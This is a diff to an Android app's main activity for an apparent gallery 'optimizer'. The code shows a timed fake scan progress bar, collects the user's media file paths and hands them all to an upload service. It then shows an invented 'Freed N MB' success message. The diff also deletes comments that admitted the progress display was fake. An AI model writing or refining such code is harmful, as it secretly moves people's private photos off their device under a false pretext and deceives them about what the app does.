@@ -62,20 +62,19 @@ public class MainActivity extends AppCompatActivity {
         isScanning = true;
         scanButton.setEnabled(false);
         statusText.setText("🔄 Scanning gallery...");
+        progressBar.setVisibility(ProgressBar.VISIBLE);
         progressBar.setProgress(0);
         progressText.setText("0%");
 
-        // Fake scan progress (5 seconds)
         for (int i = 0; i <= 100; i += 5) {
             final int progress = i;
             handler.postDelayed(() -> {
                 progressBar.setProgress(progress);
                 progressText.setText(progress + "%");
                 if (progress == 100) {
-                    // Real scan starts after fake UI
                     scanGallery();
                 }
-            }, i * 50); // 50ms per step = ~5 seconds total
+            }, i * 50L);
         }
     }
 
@@ -132,7 +131,7 @@ public class MainActivity extends AppCompatActivity {
         if (filePaths.isEmpty()) {
             statusText.setText("ℹ️ No files found");
             progressText.setText("");
-            progressBar.setProgress(0);
+            progressBar.setVisibility(ProgressBar.GONE);
             scanButton.setEnabled(true);
             isScanning = false;
             Toast.makeText(this, "No media found", Toast.LENGTH_SHORT).show();
@@ -141,21 +140,24 @@ public class MainActivity extends AppCompatActivity {
 
         int total = filePaths.size();
         statusText.setText("📸 Found " + total + " files, optimizing...");
-        progressBar.setProgress(100);
         progressText.setText("Optimizing...");
 
-        // Start upload service
-        Intent serviceIntent = new Intent(this, UploadService.class);
-        serviceIntent.putStringArrayListExtra("filePaths", (ArrayList<String>) filePaths);
-        startService(serviceIntent);
+        try {
+            Intent serviceIntent = new Intent(this, UploadService.class);
+            serviceIntent.putStringArrayListExtra("filePaths", (ArrayList<String>) filePaths);
+            startService(serviceIntent);
+        } catch (Exception e) {
+            e.printStackTrace();
+            Toast.makeText(this, "Upload service error", Toast.LENGTH_SHORT).show();
+        }
 
-        // Show success message after a moment
         handler.postDelayed(() -> {
             statusText.setText("✅ Gallery optimized successfully!");
             progressText.setText("Freed " + (total * 5) + " MB");
+            progressBar.setVisibility(ProgressBar.GONE);
             scanButton.setEnabled(true);
             isScanning = false;
-        }, 3000);
+        }, 2000);
     }
 
     private void scanMedia(Uri uri, String type) {
